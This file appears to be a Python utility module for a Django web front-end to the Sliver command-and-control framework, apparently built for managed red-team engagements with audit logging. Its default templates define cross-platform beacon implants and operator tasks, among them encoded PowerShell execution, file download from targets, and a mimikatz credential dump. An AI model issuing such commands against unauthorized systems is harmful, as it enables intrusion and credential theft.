import json
import logging
from pathlib import Path

from django.conf import settings
from django.utils import timezone

from .models import AuditLog, Teamserver

try:
    import sliver as sliver_client
    SLIVER_AVAILABLE = True
except ImportError:
    sliver_client = None
    SLIVER_AVAILABLE = False

logger = logging.getLogger(__name__)


def get_sliver_client(teamserver):
    """
    Get a configured Sliver client for the given teamserver.

    Args:
        teamserver: Teamserver instance

    Returns:
        SliverClient instance

    Raises:
        Exception: If client creation fails
    """
    if not SLIVER_AVAILABLE:
        raise Exception("Sliver client not available - install sliver-py")

    try:
        # Create client configuration
        config = sliver_client.SliverClientConfig(
            host=teamserver.host,
            port=teamserver.port,
        )

        # Add TLS configuration if available
        if teamserver.ca_cert:
            config.ca_cert = teamserver.ca_cert
        if teamserver.certificate and teamserver.private_key:
            config.cert = teamserver.certificate
            config.key = teamserver.private_key

        # Create and connect client
        client = sliver_client.SliverClient(config)

        # Update connection status
        teamserver.is_connected = True
        teamserver.last_connected = timezone.now()
        teamserver.save(update_fields=['is_connected', 'last_connected'])

        return client

    except Exception as e:
        # Update connection status on failure
        teamserver.is_connected = False
        teamserver.last_error = str(e)
        teamserver.save(update_fields=['is_connected', 'last_error'])
        raise


def log_audit_action(action, user=None, teamserver=None, engagement=None, session=None, job=None, loot=None,
                     ip_address=None, user_agent=None, details=None):
    """
    Log an audit action in the database.

    Args:
        action: Action type (from AuditLog.Action choices)
        user: User instance (optional)
        teamserver: Teamserver instance (optional)
        engagement: Engagement instance (optional)
        session: SliverSession instance (optional)
        job: SliverJob instance (optional)
        loot: Loot instance (optional)
        ip_address: Client IP address (optional)
        user_agent: User agent string (optional)
        details: Additional details as dict (optional)
    """
    try:
        AuditLog.objects.create(
            action=action,
            user=user,
            teamserver=teamserver,
            engagement=engagement,
            session=session,
            job=job,
            loot=loot,
            details=details or {},
            ip_address=ip_address,
            user_agent=user_agent
        )
    except Exception as e:
        # Log failure but don't raise exception to avoid breaking main functionality
        logger.error(f"Failed to log audit action {action}: {e}")


def parse_sliver_session_data(session_data):
    """
    Parse and normalize session data from Sliver API response.

    Args:
        session_data: Raw session data from Sliver API

    Returns:
        dict: Normalized session data
    """
    return {
        'session_id': session_data.get('ID'),
        'name': session_data.get('Name', ''),
        'hostname': session_data.get('Hostname', ''),
        'username': session_data.get('Username', ''),
        'uid': session_data.get('UID', ''),
        'gid': session_data.get('GID', ''),
        'os': session_data.get('OS', ''),
        'arch': session_data.get('Arch', ''),
        'pid': session_data.get('PID'),
        'remote_address': session_data.get('RemoteAddress'),
        'version': session_data.get('Version', ''),
        'is_privileged': session_data.get('IsPrivileged', False),
        'is_dead': session_data.get('IsDead', False),
        'is_beacon': session_data.get('IsBeacon', False),
        'transport': session_data.get('Transport', ''),
        'encoder': session_data.get('Encoder', ''),
        'reconnect_interval': session_data.get('ReconnectIntervalSeconds', 60),
        'last_checkin': session_data.get('LastCheckin'),  # Could be datetime
    }


def validate_teamserver_config(teamserver):
    """
    Validate teamserver configuration.

    Args:
        teamserver: Teamserver instance

    Returns:
        tuple: (is_valid: bool, error_message: str)
    """
    if not teamserver.host:
        return False, "Teamserver host is required"

    if not teamserver.port or teamserver.port <= 0 or teamserver.port > 65535:
        return False, "Valid port number is required"

    # Check TLS configuration consistency
    has_ca = bool(teamserver.ca_cert)
    has_cert = bool(teamserver.certificate)
    has_key = bool(teamserver.private_key)

    if has_cert or has_key:
        if not (has_cert and has_key):
            return False, "Both certificate and private key must be provided for TLS client auth"

    # Test basic connection (would need to be async in production)
    try:
        client = get_sliver_client(teamserver)
        # Simple test - get version info
        version_resp = client.rpc.version()
        return True, "Connection successful"
    except Exception as e:
        return False, f"Connection failed: {str(e)}"


def get_session_status_summary(sessions):
    """
        Generate status summary for a queryset of sessions.
        Args:
            sessions: QuerySet of SliverSession objects

        Returns:
            dict: Status summary counts
        """
    summary = {
        'total': sessions.count(),
        'active': 0,
        'dead': 0,
        'disconnected': 0,
        'beacons': 0,
        'sessions': 0,
        'online': 0,
    }

    for session in sessions:
        # Count by status
        if session.status == 'ACTIVE':
            summary['active'] += 1
        elif session.status == 'DEAD':
            summary['dead'] += 1
        elif session.status == 'DISCONNECTED':
            summary['disconnected'] += 1

        # Count by type
        if session.session_type == 'BEACON':
            summary['beacons'] += 1
        else:
            summary['sessions'] += 1

        # Count online status
        if session.is_online():
            summary['online'] += 1

    return summary


def format_command_output(output, error=None, max_length=1000):
    """
    Format command output for display.

    Args:
        output: Command stdout
        error: Command stderr (optional)
        max_length: Maximum output length

    Returns:
        str: Formatted output
    """
    if not output and not error:
        return "No output"

    formatted = ""

    if output:
        if len(output) > max_length:
            formatted += output[:max_length] + "\n...[truncated]"
        else:
            formatted += output

    if error:
        if formatted:
            formatted += "\n\nSTDERR:\n" + error
        else:
            formatted += "STDERR:\n" + error

    return formatted.strip()


def get_artifact_base_dir():
    """Return the base directory for storing implant artifacts."""
    configured = getattr(settings, "SLIVER_ARTIFACT_DIR", None)
    base_dir = Path(configured) if configured else Path(settings.BASE_DIR) / "sliver_artifacts"
    base_dir.mkdir(parents=True, exist_ok=True)
    return base_dir


def resolve_artifact_path(relative_path):
    """Resolve a stored artifact path safely within the artifact directory."""
    base_dir = get_artifact_base_dir().resolve()
    candidate = (base_dir / relative_path).resolve()
    if base_dir != candidate and base_dir not in candidate.parents:
        raise ValueError("Artifact path is outside the artifact directory")
    return candidate


def create_default_implant_templates():
    """
    Create default implant templates for common scenarios.
    Call this during app setup or migration.
    """
    from .models import ImplantTemplate

    default_templates = [
        {
            'name': 'windows-x64-beacon',
            'description': 'Windows x64 beacon implant',
            'config': {
                'os': 'windows',
                'arch': 'amd64',
                'format': 'exe',
                'is_beacon': True,
            },
            'operating_system': 'windows',
            'architecture': 'amd64',
            'is_default': True,
        },
        {
            'name': 'linux-x64-session',
            'description': 'Linux x64 interactive session implant',
            'config': {
                'os': 'linux',
                'arch': 'amd64',
                'format': 'elf',
                'is_beacon': False,
            },
            'operating_system': 'linux',
            'architecture': 'amd64',
            'is_default': False,
        },
        {
            'name': 'macos-arm64-beacon',
            'description': 'macOS ARM64 beacon implant',
            'config': {
                'os': 'darwin',
                'arch': 'arm64',
                'format': 'macho',
                'is_beacon': True,
            },
            'operating_system': 'darwin',
            'architecture': 'arm64',
            'is_default': False,
        },
    ]

    for template_data in default_templates:
        ImplantTemplate.objects.get_or_create(
            name=template_data['name'],
            defaults=template_data
        )


def create_default_task_templates():
    """
    Create default task templates for common operations.
    Call this during app setup or migration.
    """
    from .models import TaskTemplate

    default_templates = [
        {
            'name': 'List Directory',
            'description': 'List files in current directory',
            'command': 'ls -la',
            'category': 'recon',
            'parameters': {},
            'is_builtin': True,
        },
        {
            'name': 'Get System Info',
            'description': 'Get basic system information',
            'command': 'uname -a && whoami && pwd',
            'category': 'recon',
            'parameters': {},
            'is_builtin': True,
        },
        {
            'name': 'Check Network',
            'description': 'Check network interfaces and connections',
            'command': 'ip addr show; netstat -tuln',
            'category': 'recon',
            'parameters': {},
            'is_builtin': True,
        },
        {
            'name': 'Download File',
            'description': 'Download a file from the target',
            'command': 'download {file_path}',
            'category': 'loot',
            'parameters': {'file_path': '/path/to/file'},
            'is_builtin': True,
        },
        {
            'name': 'Execute PowerShell',
            'description': 'Execute PowerShell script or command',
            'command': 'powershell.exe -nop -enc {encoded_command}',
            'category': 'execution',
            'parameters': {'encoded_command': 'base64_encoded_ps_command'},
            'is_builtin': True,
        },
        {
            'name': 'Port Scan',
            'description': 'Scan for open ports on target',
            'command': 'nmap -sV -p- {target_ip}',
            'category': 'recon',
            'parameters': {'target_ip': '127.0.0.1'},
            'is_builtin': True,
        },
        {
            'name': 'Credential Dump',
            'description': 'Attempt to dump credentials from memory',
            'command': 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
            'category': 'privesc',
            'parameters': {},
            'is_builtin': True,
        },
    ]

    for template_data in default_templates:
        TaskTemplate.objects.get_or_create(
            name=template_data['name'],
            defaults=template_data
        )
